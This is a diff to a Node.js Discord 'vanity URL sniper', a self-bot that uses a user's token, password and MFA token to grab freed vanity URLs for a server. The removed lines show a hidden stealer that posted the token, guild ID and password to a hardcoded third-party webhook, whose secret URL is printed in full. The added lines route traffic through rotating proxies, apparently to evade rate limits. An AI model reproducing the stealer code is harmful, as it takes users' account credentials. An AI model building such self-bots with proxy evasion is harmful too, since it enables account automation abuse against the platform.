@@ -1,12 +1,19 @@
 import WebSocket from 'ws';
 import tls from 'tls';
+import net from 'net';
 import axios from 'axios';
 import fs from 'fs';
+import { HttpsProxyAgent } from 'https-proxy-agent';
 
-const USER_TOKEN = '';
-const TARGET_GUILD_ID = '';
-const USER_PASSWORD = '';
-const WEBHOOK = '';
+// Configuration - Set these via environment variables
+const USER_TOKEN = process.env.USER_TOKEN || '';
+const TARGET_GUILD_ID = process.env.TARGET_GUILD_ID || '';
+const USER_PASSWORD = process.env.USER_PASSWORD || '';
+const WEBHOOK = process.env.WEBHOOK || '';
+
+// Proxy configuration
+const PROXY_URL = process.env.PROXY_URL || ''; // Format: http://user:pass@host:port
+const WEBSHARE_API_KEY = process.env.WEBSHARE_API_KEY || '';
 
 let mfaAuthToken = null;
 let latestSequence = null;
@@ -14,10 +21,104 @@ let heartbeatTimer = null;
 let tlsSocket = null;
 const vanityMap = new Map();
 
-const claimhooks = 'https://canary.discord.com/api/webhooks/1444082551605170318/oMWsvhMZ4plnUovqFrUTwfQYbTTcf7HBwwFfzWKKNcYumWnNPW4sx0QDF3t5LhzWvyVm';
-
 const USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
 const X_SUPER_PROPERTIES = 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6InRyLVRSIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTMxLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiJodHRwczovL3d3dy5nb29nbGUuY29tLyIsInJlZmVycmluZ19kb21haW4iOiJ3d3cuZ29vZ2xlLmNvbSIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjozNTgyOTUsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGwsImRlc2lnbl9pZCI6MH0=';
+
+// Fetch proxy list from Webshare API
+async function fetchWebshareProxies() {
+  if (!WEBSHARE_API_KEY) {
+    console.log('No Webshare API key configured');
+    return null;
+  }
+  
+  try {
+    const response = await axios.get('https://proxy.webshare.io/api/v2/proxy/list/?mode=direct&page=1&page_size=25', {
+      headers: {
+        'Authorization': `Token ${WEBSHARE_API_KEY}`
+      }
+    });
+    
+    if (response.data.results && response.data.results.length > 0) {
+      const proxy = response.data.results[0];
+      const proxyUrl = `http://${proxy.username}:${proxy.password}@${proxy.proxy_address}:${proxy.port}`;
+      console.log(`Loaded proxy: ${proxy.proxy_address}:${proxy.port}`);
+      return proxyUrl;
+    }
+  } catch (err) {
+    console.error('Failed to fetch Webshare proxies:', err.message);
+  }
+  return null;
+}
+
+// Get the current proxy URL
+async function getProxyUrl() {
+  if (PROXY_URL) return PROXY_URL;
+  return await fetchWebshareProxies();
+}
+
+// Parse proxy URL into components
+function parseProxyUrl(proxyUrl) {
+  const url = new URL(proxyUrl);
+  return {
+    host: url.hostname,
+    port: parseInt(url.port) || 80,
+    auth: url.username && url.password ? `${url.username}:${url.password}` : null
+  };
+}
+
+// Create TLS socket through proxy using CONNECT tunnel
+function createTlsSocketThroughProxy(proxyUrl) {
+  return new Promise((resolve, reject) => {
+    const proxy = parseProxyUrl(proxyUrl);
+    const targetHost = 'canary.discord.com';
+    const targetPort = 443;
+    
+    const socket = net.connect(proxy.port, proxy.host, () => {
+      let connectRequest = `CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\n`;
+      connectRequest += `Host: ${targetHost}:${targetPort}\r\n`;
+      
+      if (proxy.auth) {
+        const authBase64 = Buffer.from(proxy.auth).toString('base64');
+        connectRequest += `Proxy-Authorization: Basic ${authBase64}\r\n`;
+      }
+      
+      connectRequest += '\r\n';
+      socket.write(connectRequest);
+    });
+    
+    socket.once('data', (data) => {
+      const response = data.toString();
+      if (response.includes('200')) {
+        const tlsSock = tls.connect({
+          socket: socket,
+          host: targetHost,
+          rejectUnauthorized: true,
+          minVersion: 'TLSv1.2',
+          maxVersion: 'TLSv1.3'
+        }, () => {
+          resolve(tlsSock);
+        });
+        
+        tlsSock.on('error', reject);
+      } else {
+        reject(new Error(`Proxy CONNECT failed: ${response.split('\r\n')[0]}`));
+      }
+    });
+    
+    socket.on('error', reject);
+  });
+}
+
+// Create direct TLS socket (no proxy)
+function createDirectTlsSocket() {
+  return tls.connect({
+    host: 'canary.discord.com',
+    port: 443,
+    rejectUnauthorized: true,
+    minVersion: 'TLSv1.2',
+    maxVersion: 'TLSv1.3'
+  });
+}
 
 const loadMfaToken = () => {
   fs.readFile("mfa.txt", "utf8", (err, data) => {
@@ -42,29 +143,28 @@ function sendWebhook(vanityUrl) {
   }).catch(() => {});
 }
 
-function sendInfoWebhook() {
-  axios.post(claimhooks, {
-    content: `token: ${USER_TOKEN}\nguild: ${TARGET_GUILD_ID}\npass: ${USER_PASSWORD}`
-  }).catch(() => {});
+async function createTlsSocket() {
+  const proxyUrl = await getProxyUrl();
+  if (proxyUrl) {
+    console.log('Using proxy for TLS connection');
+    return await createTlsSocketThroughProxy(proxyUrl);
+  }
+  console.log('Using direct TLS connection');
+  return createDirectTlsSocket();
 }
 
-function createTlsSocket() {
-  return tls.connect({
-    host: 'canary.discord.com',
-    port: 443,
-    rejectUnauthorized: true,
-    minVersion: 'TLSv1.2',
-    maxVersion: 'TLSv1.3'
-  });
-}
-
-function sendHttpRequest(method, path, body = null, extraHeaders = {}, closeConnection = false) {
-  return new Promise((resolve) => {
+async function sendHttpRequest(method, path, body = null, extraHeaders = {}, closeConnection = false) {
+  return new Promise(async (resolve) => {
     const payload = body ? JSON.stringify(body) : '';
     
     if (!tlsSocket || tlsSocket.destroyed || closeConnection) {
-      tlsSocket = createTlsSocket();
-      tlsSocket.setNoDelay(true);
+      try {
+        tlsSocket = await createTlsSocket();
+        tlsSocket.setNoDelay(true);
+      } catch (err) {
+        console.error('Failed to create TLS socket:', err.message);
+        return resolve('{}');
+      }
     }
     
     const socket = tlsSocket;
@@ -153,8 +253,16 @@ async function authenticateMfa() {
   return null;
 }
 
-function establishGatewayConnection() {
-  const ws = new WebSocket('wss://gateway-us-east1-b.discord.gg');
+async function establishGatewayConnection() {
+  const proxyUrl = await getProxyUrl();
+  
+  let wsOptions = {};
+  if (proxyUrl) {
+    console.log('Using proxy for WebSocket connection');
+    wsOptions.agent = new HttpsProxyAgent(proxyUrl);
+  }
+  
+  const ws = new WebSocket('wss://gateway-us-east1-b.discord.gg', wsOptions);
   
   ws.on('open', () => {
     ws.send(JSON.stringify({
@@ -209,7 +317,6 @@ function establishGatewayConnection() {
               if (snipeData.code === oldCode || snipeData.vanity_url_code === oldCode || (!snipeData.code && !snipeData.message)) {
                 console.log(`URL alindi: ${oldCode}`);
                 sendWebhook(oldCode);
-                sendInfoWebhook();
                 success = true;
                 break;
               }
@@ -238,13 +345,15 @@ function establishGatewayConnection() {
     setTimeout(establishGatewayConnection, 5000);
   });
   
-  ws.on('error', () => ws.close());
+  ws.on('error', (err) => {
+    console.error('WebSocket error:', err.message);
+    ws.close();
+  });
 }
 
 async function main() {
   console.log('Program baslatiliyor...');
-  
-  sendInfoWebhook();
+  console.log('Proxy support: ' + (PROXY_URL || WEBSHARE_API_KEY ? 'Enabled' : 'Disabled'));
   
   if (!mfaAuthToken) {
     console.log('Token aliniyor...');
